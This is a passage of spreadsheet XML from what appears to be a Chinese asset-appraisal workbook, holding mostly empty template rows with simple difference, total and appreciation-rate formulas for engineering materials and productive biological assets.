      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-H13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(H13=0,"",L13/H13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-H14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(H14=0,"",L14/H14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-H15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(H15=0,"",L15/H15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-H16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(H16=0,"",L16/H16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-H17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(H17=0,"",L17/H17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-H18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(H18=0,"",L18/H18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-H19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(H19=0,"",L19/H19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-H20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(H20=0,"",L20/H20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-H21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(H21=0,"",L21/H21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-H22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(H22=0,"",L22/H22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-H23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(H23=0,"",L23/H23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-H24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(H24=0,"",L24/H24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-H25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(H25=0,"",L25/H25*100)</f>
        <v/>
      </c>
      <c r="N25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555">
        <f>K26-H26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(H26=0,"",L26/H26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="593" t="n"/>
      <c r="E27" s="567" t="n"/>
      <c r="F27" s="564">
        <f>SUM(F7:F26)</f>
        <v/>
      </c>
      <c r="G27" s="564" t="n"/>
      <c r="H27" s="564">
        <f>SUM(H7:H26)</f>
        <v/>
      </c>
      <c r="I27" s="564">
        <f>SUM(I7:I26)</f>
        <v/>
      </c>
      <c r="J27" s="564" t="n"/>
      <c r="K27" s="564">
        <f>SUM(K7:K26)</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>K27-H27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(H27=0,"",L27/H27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>减：工程物资减值准备</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="593" t="n"/>
      <c r="E28" s="567" t="n"/>
      <c r="F28" s="555" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555">
        <f>K28-H28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(H28=0,"",L28/H28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="593" t="n"/>
      <c r="D29" s="593" t="n"/>
      <c r="E29" s="567" t="n"/>
      <c r="F29" s="564">
        <f>F27-F28</f>
        <v/>
      </c>
      <c r="G29" s="564" t="n"/>
      <c r="H29" s="564">
        <f>H27-H28</f>
        <v/>
      </c>
      <c r="I29" s="564">
        <f>I27-I28</f>
        <v/>
      </c>
      <c r="J29" s="564" t="n"/>
      <c r="K29" s="564">
        <f>K27-K28</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>K29-H29</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>IF(H29=0,"",L29/H29*100)</f>
        <v/>
      </c>
      <c r="N29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="16">
    <mergeCell ref="B4:F4"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="B27:E27"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="F5:H5"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="I5:K5"/>
    <mergeCell ref="B28:E28"/>
    <mergeCell ref="B29:E29"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="M3:N3"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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 codeName="Sheet67">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A7" sqref="A7:A24"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="4.33333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="6.16666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="6.66666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="11.3333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="8.16666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="8.16666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="10.6666666666667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生产性生物资产评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="17.2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373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="373" t="n"/>
      <c r="K3" s="373" t="n"/>
      <c r="L3" s="402" t="inlineStr">
        <is>
          <t>表4-10</t>
        </is>
      </c>
    </row>
    <row r="4" ht="17.2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176" t="n"/>
      <c r="M4" s="176" t="n"/>
      <c r="N4" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="17.25" customFormat="1" customHeight="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>种类</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>群别</t>
        </is>
      </c>
      <c r="E5" s="272" t="inlineStr">
        <is>
          <t>计量
单位</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>购置日期</t>
        </is>
      </c>
      <c r="H5" s="187" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="567" t="n"/>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="K5" s="593" t="n"/>
      <c r="L5" s="567" t="n"/>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="17.25" customFormat="1" customHeight="1" s="369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307" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="I6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
    </row>
    <row r="7" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="587" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="552" t="n"/>
      <c r="L7" s="555">
        <f>ROUND(J7*K7/100,-1)</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(I7=0,"",(L7-I7)/I7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="587" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="552" t="n"/>
      <c r="L8" s="555">
        <f>ROUND(J8*K8/100,-1)</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(I8=0,"",(L8-I8)/I8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="587" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="552" t="n"/>
      <c r="L9" s="555">
        <f>ROUND(J9*K9/100,-1)</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(I9=0,"",(L9-I9)/I9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="587" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="552" t="n"/>
      <c r="L10" s="555">
        <f>ROUND(J10*K10/100,-1)</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(I10=0,"",(L10-I10)/I10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="587" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="552" t="n"/>
      <c r="L11" s="555">
        <f>ROUND(J11*K11/100,-1)</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(I11=0,"",(L11-I11)/I11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="587" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="552" t="n"/>
      <c r="L12" s="555">
        <f>ROUND(J12*K12/100,-1)</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(I12=0,"",(L12-I12)/I12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="587" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="552" t="n"/>
      <c r="L13" s="555">
        <f>ROUND(J13*K13/100,-1)</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(I13=0,"",(L13-I13)/I13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="587" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="552" t="n"/>
      <c r="L14" s="555">
        <f>ROUND(J14*K14/100,-1)</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(I14=0,"",(L14-I14)/I14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="587" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="552" t="n"/>
      <c r="L15" s="555">
        <f>ROUND(J15*K15/100,-1)</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(I15=0,"",(L15-I15)/I15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="587" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="552" t="n"/>
      <c r="L16" s="555">
        <f>ROUND(J16*K16/100,-1)</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(I16=0,"",(L16-I16)/I16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="587" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="552" t="n"/>
      <c r="L17" s="555">
        <f>ROUND(J17*K17/100,-1)</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(I17=0,"",(L17-I17)/I17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="587" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="552" t="n"/>
      <c r="L18" s="555">
        <f>ROUND(J18*K18/100,-1)</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(I18=0,"",(L18-I18)/I18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="587" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="552" t="n"/>
      <c r="L19" s="555">
        <f>ROUND(J19*K19/100,-1)</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(I19=0,"",(L19-I19)/I19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="587" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="552" t="n"/>
      <c r="L20" s="555">
        <f>ROUND(J20*K20/100,-1)</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(I20=0,"",(L20-I20)/I20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="587" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="552" t="n"/>
      <c r="L21" s="555">
        <f>ROUND(J21*K21/100,-1)</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(I21=0,"",(L21-I21)/I21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="587" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="552" t="n"/>
      <c r="L22" s="555">
        <f>ROUND(J22*K22/100,-1)</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(I22=0,"",(L22-I22)/I22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="587" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="552" t="n"/>
      <c r="L23" s="555">
        <f>ROUND(J23*K23/100,-1)</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(I23=0,"",(L23-I23)/I23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="587" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
